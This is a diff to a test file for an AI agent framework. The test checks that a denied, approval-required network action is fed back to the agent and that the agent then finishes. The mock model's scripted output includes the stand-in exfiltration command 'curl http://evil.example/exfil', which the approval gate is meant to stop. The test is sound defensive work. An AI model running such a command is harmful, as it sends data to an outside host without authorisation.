@@ -157,6 +157,9 @@ test("an approval-required action parks the run and resumes on the delivered dec
 test("a denied action is fed back and the agent adapts", async () => {
   const { model } = reactiveModel([
     "```bash\ncurl http://evil.example/exfil\n```", // network → requires approval
+    // First finish after the denial is nudged by the verified-finish
+    // guard (nothing has succeeded yet); the second is honored.
+    "```finish\nUnderstood, skipped the network call.\n```",
     "```finish\nUnderstood, skipped the network call.\n```",
   ]);
   const { provider } = await localProvider();
